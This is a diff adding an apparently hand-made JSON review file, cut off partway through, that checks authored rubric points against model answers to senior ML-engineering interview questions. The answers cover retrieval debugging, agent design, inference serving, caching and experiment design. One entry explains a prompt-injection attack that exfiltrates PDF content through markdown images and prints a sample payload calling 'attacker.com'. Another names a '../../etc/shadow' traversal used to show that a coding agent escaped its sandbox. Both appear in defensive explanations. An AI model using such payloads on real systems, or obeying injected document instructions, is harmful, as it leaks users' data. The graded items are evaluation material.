@@ -1,0 +1,1026 @@
+{
+  "reviewer": "Codex manual reading; not independent human review",
+  "method": "30 selected questions spanning priority topics. Read each of 120 authored points against its own unchanged model answer; record exact supporting source excerpts. No model-based support verdicts. This checks answer support, not independent factual correctness.",
+  "questions": [
+    {
+      "questionId": "senior:debug-retrieval-recall-drop-reindex",
+      "topic": "debug",
+      "checks": [
+        {
+          "point": "Check ef_search, M, vector normalization and distance metric.",
+          "answerExcerpts": [
+            "I'd begin by looking at ef_search and M, while also sanity-checking vector normalization and confirming the distance metric matches the index schema."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Sweep ef_search against held-out queries.",
+          "answerExcerpts": [
+            "To isolate this, I would sweep ef_search between 16 and 256 against a held-out eval set, check dot products on unit vectors to rule out norm drift, and diff the collection's Terraform configuration."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Restore ef_search from 16 to 128.",
+          "answerExcerpts": [
+            "When latency drops from 42ms down to 8ms while recall falls from 89% to 64%, my immediate instinct is that our graph traversal got cut short. I'd begin by looking at ef_search and M, while also sanity-checking vector normalization and confirming the distance metric matches the index schema. To isolate this, I would sweep ef_search between 16 and 256 against a held-out eval set, check dot products on unit vectors to rule out norm drift, and diff the collection's Terraform configuration. In this case, the root cause is that Terraform reset ef_search to a default of 16 instead of 128, terminating the beam search before exploring enough candidate neighbors. The immediate remedy is updating the client connection to set ef_search=128. Long-term, we guard against this by running an automated CI gate with 500 gold queries against any newly built index snapshot before flipping the production alias pointer."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Gate index promotion on 500 gold queries.",
+          "answerExcerpts": [
+            "Long-term, we guard against this by running an automated CI gate with 500 gold queries against any newly built index snapshot before flipping the production alias pointer."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:debug-agent-cost-doubled-prompt-change",
+      "topic": "debug",
+      "checks": [
+        {
+          "point": "Compare reasoning step counts before and after the prompt change.",
+          "answerExcerpts": [
+            "In OpenTelemetry, I would compare step count percentiles before and after the prompt push, chart cumulative context growth per step, and filter traces for duplicate API calls."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Repeated source verification expands searches and context.",
+          "answerExcerpts": [
+            "What happened is the instruction 'verify all sources' triggered three to five recursive web searches for every single claim, ballooning the context past 45,000 tokens on multi-turn history."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Limit verification to two sources and reasoning to eight steps.",
+          "answerExcerpts": [
+            "We fix this by bounding the prompt to 'verify using at most two sources', capping total reasoning steps at 8, and caching search results to prevent re-querying."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Cache searches and enforce token budgets in CI.",
+          "answerExcerpts": [
+            "An overnight cost jump from 4 cents to 18 cents after a prompt change screams uncontrolled agent loop expansion. I would investigate three areas: the distribution of reasoning steps per run, token accumulation across conversation history, and whether external tool calls are cycling repeatedly. In OpenTelemetry, I would compare step count percentiles before and after the prompt push, chart cumulative context growth per step, and filter traces for duplicate API calls. What happened is the instruction 'verify all sources' triggered three to five recursive web searches for every single claim, ballooning the context past 45,000 tokens on multi-turn history. We fix this by bounding the prompt to 'verify using at most two sources', capping total reasoning steps at 8, and caching search results to prevent re-querying. In CI, we set strict token spend budgets and fail runs if step-count standard deviation shifts significantly."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:debug-w4a16-quantized-repetitive-loop",
+      "topic": "debug",
+      "checks": [
+        {
+          "point": "Inspect the language distribution of AWQ calibration data.",
+          "answerExcerpts": [
+            "I would inspect the linguistic distribution of the AWQ calibration corpus, check activation outlier clipping on key projections, and review repetition penalty settings in inference."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Compare multilingual perplexity and logits on looping outputs.",
+          "answerExcerpts": [
+            "We verify this by measuring perplexity across Spanish, Hindi, and English evaluation sets and logging top-token logits on looped sequences."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Recalibrate with target-language data and smaller quantization groups.",
+          "answerExcerpts": [
+            "A quantized model looping repetitively in non-English languages indicates calibration dataset bias during quantization. I would inspect the linguistic distribution of the AWQ calibration corpus, check activation outlier clipping on key projections, and review repetition penalty settings in inference. We verify this by measuring perplexity across Spanish, Hindi, and English evaluation sets and logging top-token logits on looped sequences. The diagnosis is that the calibration corpus was entirely English Wikipedia, so Spanish and Hindi activations exceeded clipped FP16 bounds, distorting attention weights and trapping generation in degenerate loops. The fix is recalibrating AWQ with a balanced multilingual corpus containing at least 20% target non-English tokens and setting group_size=64 instead of 128 for sensitive projections. We enforce this by requiring multilingual perplexity verification gates on all quantized model deployment artifacts."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Require multilingual perplexity checks before deployment.",
+          "answerExcerpts": [
+            "We enforce this by requiring multilingual perplexity verification gates on all quantized model deployment artifacts."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:debug-cross-encoder-reranker-latency-breach",
+      "topic": "debug",
+      "checks": [
+        {
+          "point": "Profile candidate counts, padding and sequence lengths.",
+          "answerExcerpts": [
+            "I would evaluate the candidate count fed to the cross-encoder, inspect GPU batch size and padding efficiency during inference, and check sequence length distribution across query-document pairs."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Cross-encoders score concatenated query-document pairs.",
+          "answerExcerpts": [
+            "A reranking latency leap from 65ms to 840ms when candidate count rises from 20 to 100 indicates quadratic cross-encoder computation scaling under batching constraints. I would evaluate the candidate count fed to the cross-encoder, inspect GPU batch size and padding efficiency during inference, and check sequence length distribution across query-document pairs. We confirm this by profiling reranker latency with candidate pools from 20 to 100 and measuring TensorRT-LLM or ONNX batch execution times. The root cause is that a cross-encoder concatenates the query with every document, so scoring 100 candidates with 512 tokens each requires evaluating 51,200 tokens across heavy self-attention layers on a single GPU. The remedy is adopting a two-stage reranking pipeline: score 100 candidates with a fast bi-encoder or lightweight ColBERT late-interaction model, then forward only the top-20 candidates to the heavy cross-encoder. We enforce this by setting a strict SLA timeout and hard ceiling of 25 candidates on the cross-encoder API gateway."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Use lightweight first-stage reranking before the heavy cross-encoder.",
+          "answerExcerpts": [
+            "The remedy is adopting a two-stage reranking pipeline: score 100 candidates with a fast bi-encoder or lightweight ColBERT late-interaction model, then forward only the top-20 candidates to the heavy cross-encoder."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Cap cross-encoder candidates and enforce an SLA timeout.",
+          "answerExcerpts": [
+            "We enforce this by setting a strict SLA timeout and hard ceiling of 25 candidates on the cross-encoder API gateway."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:debug-coding-agent-path-traversal-sandbox",
+      "topic": "debug",
+      "checks": [
+        {
+          "point": "Inspect container mounts, user privileges and capabilities.",
+          "answerExcerpts": [
+            "I would inspect the Docker volume mount flags, review user privilege mappings and Linux capabilities in the container manifest, and examine the agent's tool execution code."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Reproduce path traversal and inspect container mount output.",
+          "answerExcerpts": [
+            "We reproduce the breach by checking if the container runs as root, testing relative path traversal like ../../etc/shadow, and inspecting the output of mount inside the container."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Use an unprivileged user, isolated mount and read-only root.",
+          "answerExcerpts": [
+            "The fix is running the container with an unprivileged user (--user 1000:1000), mounting only an isolated ephemeral directory with read-only root (--read-only), dropping all capabilities (--cap-drop=ALL), and enforcing path canonicalization in Python before tool execution."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Drop capabilities, canonicalize paths and test restricted access.",
+          "answerExcerpts": [
+            "A coding agent escaping its workspace and accessing host files indicates incomplete container isolation and insecure volume mounting. I would inspect the Docker volume mount flags, review user privilege mappings and Linux capabilities in the container manifest, and examine the agent's tool execution code. We reproduce the breach by checking if the container runs as root, testing relative path traversal like ../../etc/shadow, and inspecting the output of mount inside the container. The root cause is that Docker was launched with -v /host:/workspace without user namespacing, running as root with default capabilities, allowing the agent to resolve parent paths beyond /workspace. The fix is running the container with an unprivileged user (--user 1000:1000), mounting only an isolated ephemeral directory with read-only root (--read-only), dropping all capabilities (--cap-drop=ALL), and enforcing path canonicalization in Python before tool execution. We ensure sandbox integrity by running automated penetration tests in CI that verify restricted directory access fails."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:debug-multimodal-markdown-image-exfiltration",
+      "topic": "debug",
+      "checks": [
+        {
+          "point": "Inspect hidden PDF instructions and outbound client requests.",
+          "answerExcerpts": [
+            "I would inspect the parsed PDF content for invisible prompt injection instructions, review markdown rendering sanitization in the client UI, and analyze outbound network traffic from the client."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Prompt injection encodes document text in external Markdown image URLs.",
+          "answerExcerpts": [
+            "Unauthorized outbound HTTP requests containing document text reveal a markdown image exfiltration attack via prompt injection. I would inspect the parsed PDF content for invisible prompt injection instructions, review markdown rendering sanitization in the client UI, and analyze outbound network traffic from the client. We isolate this by searching the PDF's text layer for hidden instructions like ![exfil](https://attacker.com/?data=...) and testing client-side HTML output rendering. The root cause is indirect prompt injection: a malicious document contained hidden white text directing the LLM to summarize sensitive findings and append them as URL query parameters in an image markdown tag, which the frontend rendered directly. The fix is sanitizing rendered Markdown using DOMPurify with image rendering restricted to trusted CDN domains, and implementing a strict Content Security Policy (img-src 'self' data:) that blocks third-party image fetches. We prevent exfiltration by running all document processing through input safety classifiers and enforcing outbound network restrictions in the frontend."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Restrict image rendering to trusted domains.",
+          "answerExcerpts": [
+            "The fix is sanitizing rendered Markdown using DOMPurify with image rendering restricted to trusted CDN domains, and implementing a strict Content Security Policy (img-src 'self' data:) that blocks third-party image fetches."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Enforce an image Content Security Policy and outbound network restrictions.",
+          "answerExcerpts": [
+            "Unauthorized outbound HTTP requests containing document text reveal a markdown image exfiltration attack via prompt injection. I would inspect the parsed PDF content for invisible prompt injection instructions, review markdown rendering sanitization in the client UI, and analyze outbound network traffic from the client. We isolate this by searching the PDF's text layer for hidden instructions like ![exfil](https://attacker.com/?data=...) and testing client-side HTML output rendering. The root cause is indirect prompt injection: a malicious document contained hidden white text directing the LLM to summarize sensitive findings and append them as URL query parameters in an image markdown tag, which the frontend rendered directly. The fix is sanitizing rendered Markdown using DOMPurify with image rendering restricted to trusted CDN domains, and implementing a strict Content Security Policy (img-src 'self' data:) that blocks third-party image fetches. We prevent exfiltration by running all document processing through input safety classifiers and enforcing outbound network restrictions in the frontend."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:debug-ab-test-sample-ratio-mismatch",
+      "topic": "debug",
+      "checks": [
+        {
+          "point": "Check assignment hashing and device-specific tracking losses.",
+          "answerExcerpts": [
+            "I would inspect the user hashing function across variant assignments, check for latency differences causing tracking failures before page load, and evaluate browser or device type distributions."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Latency causes variant users to leave before client beacons fire.",
+          "answerExcerpts": [
+            "The root cause is that the new search variant introduced a 450ms reranking latency regression, causing users on mobile connections to abandon the page before the client tracking beacon fired, systematically undercounting variant sessions."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Log experiment assignments server-side before rendering.",
+          "answerExcerpts": [
+            "The fix is moving experiment bucketing and assignment logging server-side at the gateway before rendering, while addressing the 450ms latency bottleneck in the search pipeline."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Run daily chi-square SRM checks and fix the latency regression.",
+          "answerExcerpts": [
+            "A 47,800 versus 52,200 sample ratio mismatch on a 50/50 A/B test indicates differential user drop-off or biased bucket assignment. I would inspect the user hashing function across variant assignments, check for latency differences causing tracking failures before page load, and evaluate browser or device type distributions. We confirm this by computing chi-square test statistics on user demographic breakdowns (mobile vs desktop, connection speed) across control and variant buckets. The root cause is that the new search variant introduced a 450ms reranking latency regression, causing users on mobile connections to abandon the page before the client tracking beacon fired, systematically undercounting variant sessions. The fix is moving experiment bucketing and assignment logging server-side at the gateway before rendering, while addressing the 450ms latency bottleneck in the search pipeline. We protect future experiments by running automated daily SRM checks with chi-square tests and alerting immediately when allocation p-values fall below 0.01."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:debug-agent-async-tool-race-condition",
+      "topic": "debug",
+      "checks": [
+        {
+          "point": "Inspect tool dispatch timestamps and replay sequential execution.",
+          "answerExcerpts": [
+            "We isolate this by logging dispatch and completion timestamps in OpenTelemetry traces and replaying the execution with forced sequential tool calls."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Concurrent read-modify-write updates overwrite state and repeat bookings.",
+          "answerExcerpts": [
+            "The root cause is a read-modify-write race: search_flight and book_hotel executed concurrently; when book_hotel finished, it updated conversation state without a mutex, overwriting concurrent state and causing the agent to re-trigger booking on the next reasoning step."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Use idempotency keys and transactional state locks.",
+          "answerExcerpts": [
+            "The fix is enforcing idempotency keys on all state-mutating actions, locking state updates with transactional mutexes, and executing state-mutating tools sequentially while keeping read-only tools concurrent."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Serialize mutating tools while retaining concurrency for read-only tools.",
+          "answerExcerpts": [
+            "The fix is enforcing idempotency keys on all state-mutating actions, locking state updates with transactional mutexes, and executing state-mutating tools sequentially while keeping read-only tools concurrent."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:agent-idempotency-key-design",
+      "topic": "agents",
+      "checks": [
+        {
+          "point": "Hash session ID, step index, tool name and canonical arguments into an idempotency key.",
+          "answerExcerpts": [
+            "We construct the key by hashing the session identifier, the agent step index, the tool name, and the canonical JSON-serialized arguments with sorted keys."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Return cached results for completed keys.",
+          "answerExcerpts": [
+            "If the key exists and the status is completed, we return the cached result immediately without re-executing the action."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Wait on in-progress keys and record new executions centrally.",
+          "answerExcerpts": [
+            "If the key is in progress, subsequent attempts wait; if it does not exist, we record the key, execute the tool, store the result, and set a time-to-live expiration."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Distributed key storage adds overhead but prevents duplicate side effects.",
+          "answerExcerpts": [
+            "The trade-off is state management overhead versus mutation safety: storing idempotency keys requires distributed storage, but it prevents costly duplicate side effects during automatic retries."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:agent-partial-failure-saga-rollback",
+      "topic": "agents",
+      "checks": [
+        {
+          "point": "Register a compensating action for each mutating tool.",
+          "answerExcerpts": [
+            "For every mutating tool in a sequence, we register a corresponding undo action."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Stop forward execution on failure and compensate in reverse order.",
+          "answerExcerpts": [
+            "For example, if Step 1 books a flight and Step 2 reserves a hotel, but Step 3 fails to book the rental car, the runtime halts forward execution and executes compensating actions in reverse order: cancelling the hotel reservation and refunding the flight."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Alert an operator if compensation fails.",
+          "answerExcerpts": [
+            "If a compensating action fails, the runtime logs the error, marks the transaction as requiring manual intervention, and alerts an operator."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Irreversible side effects require human reconciliation.",
+          "answerExcerpts": [
+            "The trade-off is recovery guarantees versus external side effects: compensating actions work well for reversible operations like database updates or booking reservations, but operations like sending an email or charging a payment card cannot be silently undone and require human reconciliation."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:agent-cycle-detection-state-hashing",
+      "topic": "agents",
+      "checks": [
+        {
+          "point": "Hash tool names and arguments to detect repeated exact calls.",
+          "answerExcerpts": [
+            "For exact loops, we maintain a rolling history of tool calls and hash the tool name alongside its arguments."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Use embedding similarity to detect rephrased queries without new information.",
+          "answerExcerpts": [
+            "For semantic loops where the agent rephrases arguments, we embed recent inputs and measure cosine similarity; if consecutive queries have near-identical semantic embeddings without new information, we flag a semantic cycle."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Intervene with an alternate-strategy instruction and terminate persistent loops.",
+          "answerExcerpts": [
+            "An agent can get stuck repeating the same failed action with minor phrasing variations, such as slightly tweaking a search query without learning from previous misses. We detect and break these loops using state hashing and semantic distance tracking. For exact loops, we maintain a rolling history of tool calls and hash the tool name alongside its arguments. If the identical hash appears more than twice in recent history, an exact loop is detected. For semantic loops where the agent rephrases arguments, we embed recent inputs and measure cosine similarity; if consecutive queries have near-identical semantic embeddings without new information, we flag a semantic cycle. When a loop is detected, we intercept execution and inject a system intervention message prompting the agent to reflect on its failure or try an alternate strategy. If the loop persists, the runtime terminates the task. The trade-off is exploratory flexibility versus loop prevention: aggressive cycle detection can interrupt legitimate iterative refinement, so detection thresholds must require multiple consecutive repetitions."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Require repeated cycles to avoid interrupting legitimate refinement.",
+          "answerExcerpts": [
+            "The trade-off is exploratory flexibility versus loop prevention: aggressive cycle detection can interrupt legitimate iterative refinement, so detection thresholds must require multiple consecutive repetitions."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:agent-cascading-failure-multi-agent-backoff",
+      "topic": "agents",
+      "checks": [
+        {
+          "point": "Attach global time-to-live and hop budgets to delegated tasks.",
+          "answerExcerpts": [
+            "First, we attach a global time-to-live and hop budget header to every inter-agent task message."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Decrement hop counts and block delegation at zero.",
+          "answerExcerpts": [
+            "When Agent A delegates to Agent B, the hop counter decrements; if the counter reaches zero, further delegation is blocked, preventing unbounded recursive subagent spawning."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Retry transient failures with exponential backoff and full jitter.",
+          "answerExcerpts": [
+            "In multi-agent systems where supervisor agents delegate sub-tasks to specialized subagents, a failure in a leaf agent can trigger rapid retries that cascade upstream, causing a thundering herd that saturates downstream services. We prevent cascading failures using two mechanisms: distributed hop limits and exponential backoff with full jitter. First, we attach a global time-to-live and hop budget header to every inter-agent task message. When Agent A delegates to Agent B, the hop counter decrements; if the counter reaches zero, further delegation is blocked, preventing unbounded recursive subagent spawning. Second, when a subagent tool fails due to rate limits or transient errors, we do not retry immediately. We apply exponential backoff with full jitter, calculating sleep time as a random value between zero and the exponentially backed-off interval. The trade-off is task completion latency versus system stability: backoff delays overall task execution, but it prevents multi-agent trees from synchronizing their retries and overwhelming backend infrastructure."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Backoff adds latency but avoids synchronized retry storms.",
+          "answerExcerpts": [
+            "The trade-off is task completion latency versus system stability: backoff delays overall task execution, but it prevents multi-agent trees from synchronizing their retries and overwhelming backend infrastructure."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:serving-continuous-batching-iteration",
+      "topic": "inference-serving",
+      "checks": [
+        {
+          "point": "Static batching waits for the longest request to finish.",
+          "answerExcerpts": [
+            "Because generation lengths vary widely, short requests finish early but remain trapped in GPU memory, while the server waits for the longest request to complete."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Continuous batching schedules at individual token iterations.",
+          "answerExcerpts": [
+            "Iteration-level continuous batching schedules requests at the granularity of individual generated tokens."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Remove completed requests and insert arrivals at each step.",
+          "answerExcerpts": [
+            "At every decoding step, the engine removes requests that emitted an end-of-sequence token and inserts newly arrived requests into the running batch without pausing ongoing generations."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Dynamic scheduling adds CPU overhead while improving GPU utilization.",
+          "answerExcerpts": [
+            "The trade-off is scheduling complexity versus hardware utilization: continuous batching adds a small CPU scheduling overhead to manage dynamic batch state at every iteration, but it increases serving throughput by three to four times and eliminates idle GPU tensor core stalls."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:serving-speculative-decoding-verification",
+      "topic": "inference-serving",
+      "checks": [
+        {
+          "point": "A draft model proposes K tokens for parallel target verification.",
+          "answerExcerpts": [
+            "Speculative decoding accelerates inference by pairing a small, fast draft model with a large target model. The draft model autoregressively generates K candidate tokens cheaply. The target model then verifies all K tokens in a single forward pass, evaluating their conditional probabilities in parallel using modified causal attention masks. If the target model agrees with the draft token, the token is accepted; at the first mismatch, the target model samples a replacement token from a modified residual distribution and discards subsequent draft tokens. If the acceptance rate is high, the system generates multiple tokens per target forward pass. However, if the acceptance rate drops below approximately fifty percent, the target model rejects most draft tokens. The system still pays the latency of running the draft model and setting up verification tensors, but gains only one or two tokens per step. The trade-off is inference speedup versus draft compute overhead: speculative decoding achieves two times speedups when the draft aligns with target distributions, but degrades latency when drafting low-entropy code or math where draft models diverge frequently."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "At the first mismatch, sample a residual replacement and discard later drafts.",
+          "answerExcerpts": [
+            "If the target model agrees with the draft token, the token is accepted; at the first mismatch, the target model samples a replacement token from a modified residual distribution and discards subsequent draft tokens."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "High acceptance yields multiple tokens per target pass.",
+          "answerExcerpts": [
+            "If the acceptance rate is high, the system generates multiple tokens per target forward pass."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Low acceptance retains draft and verification overhead without enough progress.",
+          "answerExcerpts": [
+            "Speculative decoding accelerates inference by pairing a small, fast draft model with a large target model. The draft model autoregressively generates K candidate tokens cheaply. The target model then verifies all K tokens in a single forward pass, evaluating their conditional probabilities in parallel using modified causal attention masks. If the target model agrees with the draft token, the token is accepted; at the first mismatch, the target model samples a replacement token from a modified residual distribution and discards subsequent draft tokens. If the acceptance rate is high, the system generates multiple tokens per target forward pass. However, if the acceptance rate drops below approximately fifty percent, the target model rejects most draft tokens. The system still pays the latency of running the draft model and setting up verification tensors, but gains only one or two tokens per step. The trade-off is inference speedup versus draft compute overhead: speculative decoding achieves two times speedups when the draft aligns with target distributions, but degrades latency when drafting low-entropy code or math where draft models diverge frequently."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:routing-uncertainty-escalation",
+      "topic": "inference-serving",
+      "checks": [
+        {
+          "point": "Top softmax confidence alone can be misleading on out-of-distribution inputs.",
+          "answerExcerpts": [
+            "For classification models, examining the top softmax probability alone is misleading because neural networks are notoriously overconfident on out-of-distribution data."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Use top-two probability margins and entropy for classification uncertainty.",
+          "answerExcerpts": [
+            "Instead, we compute the margin between the top two probabilities, and calculate Shannon entropy across the probability distribution: high entropy indicates that probability mass is spread across multiple conflicting classes."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Measure semantic consistency across sampled generative outputs.",
+          "answerExcerpts": [
+            "For generative models, we sample multiple completions at a low temperature and measure semantic consistency across outputs."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Escalate high uncertainty to humans with a review-volume trade-off.",
+          "answerExcerpts": [
+            "In high-stakes applications like content moderation, medical document triage, or loan classification, models must recognize when they do not know the answer. We quantify uncertainty using both prediction probabilities and output entropy. For classification models, examining the top softmax probability alone is misleading because neural networks are notoriously overconfident on out-of-distribution data. Instead, we compute the margin between the top two probabilities, and calculate Shannon entropy across the probability distribution: high entropy indicates that probability mass is spread across multiple conflicting classes. For generative models, we sample multiple completions at a low temperature and measure semantic consistency across outputs. When entropy exceeds a calibrated threshold or semantic agreement is low, the pipeline flags the item as high-uncertainty, halts automated processing, and routes the ticket to a human review queue. The trade-off is automated throughput versus decision risk: conservative uncertainty thresholds ensure safety but increase human review volume, while loose thresholds risk silent model errors."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:cache-semantic-vector-similarity-thresholds",
+      "topic": "rag",
+      "checks": [
+        {
+          "point": "Semantic caches match paraphrases using query-vector similarity.",
+          "answerExcerpts": [
+            "Semantic caches use vector similarity to match paraphrases."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Low thresholds admit incorrect matches while high thresholds lose paraphrase hits.",
+          "answerExcerpts": [
+            "A semantic vector cache intercepts repeated LLM queries by comparing incoming query embeddings against cached query vectors. Because users rarely type identical queries character-for-character, exact string caches achieve low hit rates. Semantic caches use vector similarity to match paraphrases. Tuning the cosine similarity threshold is the critical trade-off. If the threshold is set too low (such as 0.85), queries with contrasting meanings or subtle domain differences match incorrect cached answers—such as returning an explanation of 'DDP' for a query asking about 'FSDP'. If the threshold is set too high (such as 0.99), even minor wording changes miss the cache, dropping hit rates down to exact-match levels. We evaluate thresholds empirically on historical query pairs using ROC curves, plotting false semantic match rates against cache hit rates. In production, thresholds are typically calibrated tightly between 0.94 and 0.97 using domain-tuned embedding models. The trade-off is cost savings versus answer correctness: semantic caching cuts 30% to 50% of LLM compute, but requires strict threshold validation to avoid returning false answers to subtly different questions."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Tune thresholds on historical query pairs using ROC curves.",
+          "answerExcerpts": [
+            "We evaluate thresholds empirically on historical query pairs using ROC curves, plotting false semantic match rates against cache hit rates."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Balance compute savings against false semantic matches.",
+          "answerExcerpts": [
+            "The trade-off is cost savings versus answer correctness: semantic caching cuts 30% to 50% of LLM compute, but requires strict threshold validation to avoid returning false answers to subtly different questions."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:experiment-switchback-marketplace-sutva",
+      "topic": "evaluation",
+      "checks": [
+        {
+          "point": "User-level randomization fails when treatment consumes shared marketplace supply.",
+          "answerExcerpts": [
+            "Standard user-level A/B testing assumes the Stable Unit Treatment Value Assumption (SUTVA): the treatment assigned to one user must not affect the outcomes of other users. In two-sided marketplaces like ride-sharing, food delivery, or shared compute clusters, this assumption fails completely due to shared supply pools. For example, if treatment users receive an aggressive algorithm that dispatches couriers faster, they consume available drivers, leaving fewer drivers for control users. Control users experience higher wait times not because their algorithm is worse, but because treatment cannibalized shared supply, leading to false positive experiment results. We solve this using switchback experimentation. Instead of randomizing by user, we randomize by geographical clusters and discrete time windows, such as alternating treatment and control every 30 minutes in a specific city zone. All users and drivers in that zone experience the identical policy during that window, eliminating direct interference. The trade-off is sample size and carryover effects versus causal validity: switchbacks produce unbiased causal estimates, but require longer runtimes and order-of-magnitude larger sample sizes to overcome temporal autocorrelation."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Switchbacks randomize geographic clusters and time windows.",
+          "answerExcerpts": [
+            "Instead of randomizing by user, we randomize by geographical clusters and discrete time windows, such as alternating treatment and control every 30 minutes in a specific city zone."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Everyone in a zone uses the same policy during a window.",
+          "answerExcerpts": [
+            "All users and drivers in that zone experience the identical policy during that window, eliminating direct interference."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Temporal autocorrelation and carryover require longer experiments.",
+          "answerExcerpts": [
+            "The trade-off is sample size and carryover effects versus causal validity: switchbacks produce unbiased causal estimates, but require longer runtimes and order-of-magnitude larger sample sizes to overcome temporal autocorrelation."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:recsys-two-tower-in-batch-negatives",
+      "topic": "system-design",
+      "checks": [
+        {
+          "point": "Separate user and item towers map inputs into a shared embedding space.",
+          "answerExcerpts": [
+            "Two-tower models perform large-scale candidate retrieval by mapping user context and candidate items into a shared embedding space using separate user and item neural networks."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "In-batch positives serve as negatives for other users via B-by-B dot products.",
+          "answerExcerpts": [
+            "Two-tower models perform large-scale candidate retrieval by mapping user context and candidate items into a shared embedding space using separate user and item neural networks. In a production catalog of 100 million items, computing full softmax over all items is computationally impossible. In-batch negative sampling solves this: within a training mini-batch of B user-item interaction pairs, the positive item for User i serves as a negative item for all other B minus one users in that same batch. This allows computing B-by-B dot products efficiently using a single matrix multiplication without sampling explicit negatives from disk. However, in-batch negative sampling introduces popularity bias: popular items appear more frequently in user interactions, meaning they are sampled as negatives far more often than rare items, causing the model to penalize popular items unfairly. We correct this using logQ correction: we compute each item's marginal sampling probability Q and subtract the log of Q from the raw dot product logit before applying cross-entropy loss. The trade-off is computational efficiency versus negative hardness: in-batch negatives provide fast O(B^2) training samples, but lack challenging hard negatives unless paired with dedicated hard negative mining."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Subtract log sampling probability Q to correct popularity-biased negatives.",
+          "answerExcerpts": [
+            "We correct this using logQ correction: we compute each item's marginal sampling probability Q and subtract the log of Q from the raw dot product logit before applying cross-entropy loss."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Add hard-negative mining when in-batch negatives are too easy.",
+          "answerExcerpts": [
+            "The trade-off is computational efficiency versus negative hardness: in-batch negatives provide fast O(B^2) training samples, but lack challenging hard negatives unless paired with dedicated hard negative mining."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:gpu-fair-share-drf-scheduling",
+      "topic": "cost-capacity",
+      "checks": [
+        {
+          "point": "Compute each tenant's largest fraction of cluster resources as its dominant share.",
+          "answerExcerpts": [
+            "Dominant Resource Fairness calculates each tenant's dominant share: the fraction of the total cluster capacity allocated to them for their most heavily consumed resource."
+          ],
+          "verdict": "supported"
+        },
+        {
